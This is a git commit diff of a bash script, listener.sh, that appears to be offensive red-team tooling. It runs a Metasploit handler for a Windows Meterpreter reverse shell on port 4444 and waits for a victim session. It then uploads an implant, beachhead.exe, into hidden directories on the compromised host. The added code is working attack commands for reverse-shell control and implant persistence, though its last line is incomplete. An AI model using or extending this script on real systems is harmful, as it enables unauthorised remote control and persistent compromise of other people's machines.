4a13b501eadec9410123a78f4a37126639932d60
ehsu4220 <31673535+ehsu4220@users.noreply.github.com>
2023-05-10 14:53:55 -0400

    Added connection to session
    Title, and MUST UPDATE THE '/path/to/beachhead.exe' with the path of the implant script

--- listener.sh
+++ listener.sh
@@ -1,8 +1,21 @@
 #!/bin/bash
 
+
+# Set up the listener in Metasploit
 msfconsole -q -x \
 "use exploit/multi/handler; \
 set PAYLOAD windows/meterpreter/reverse_tcp; \
 set LHOST $(hostname -I | cut -d' ' -f1); \
 set LPORT 4444; \
-exploit -j;"
+exploit;"
+
+# Wait for a connection from the agent
+echo "Waiting for connection..."
+while ! msfconsole -q -x "sessions" | grep "meterpreter" > /dev/null; do
+    sleep 1
+done
+
+# Connect to the agent session, install implant on hidden directories
+SESSION_ID=$(msfconsole -q -x "sessions" | grep "meterpreter" | awk '{print $1}')
+msfconsole -q -x "sessions -i $SESSION_ID -c \
+upload /path/to/beachhead.exe $dir" \
